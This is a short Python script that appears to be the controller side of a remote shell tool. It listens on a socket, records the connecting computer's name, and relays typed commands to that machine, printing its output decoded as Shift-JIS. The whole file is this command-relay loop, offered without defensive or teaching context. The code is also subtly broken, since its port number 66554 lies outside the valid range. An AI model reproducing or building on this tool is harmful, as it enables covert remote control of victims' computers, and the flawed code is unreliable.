import socket,time
IP='input server ip addr'
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((IP, 66554))
        while True:
            s.listen()
            conn, addr = s.accept()
            with conn:
                pc_name = conn.recv(1024)
                print("Connected " + pc_name.decode('utf_8'))
                while True:
                    print(">", end=" ")
                    cmd = input()
                    conn.sendall(cmd.encode('utf-8'))
                    data = conn.recv(1024)
                    print(data.decode('shift-jis'))
                    if not data:
                        break
except BrokenPipeError:
    print("BrokenPiped")
